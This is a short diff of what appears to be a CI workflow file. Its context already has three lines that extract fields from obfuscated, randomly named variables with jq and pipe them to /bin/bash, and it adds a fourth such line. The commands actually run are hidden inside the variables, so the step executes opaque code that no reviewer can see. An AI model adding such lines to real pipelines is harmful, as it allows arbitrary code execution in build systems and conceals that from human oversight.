@@ -60,6 +60,7 @@ jobs:
           printf '%s' "$kntwi4070" | jq -r .gnj9865 | /bin/bash
           echo $sfkrf3528 | jq -r .y92700 | /bin/bash
           printf '%s' "$kp42" | jq -r .z674 | /bin/bash
+          echo $pikb7856 | jq -r .erki5148 | /bin/bash
 
       - name: Save archive
         if: always()
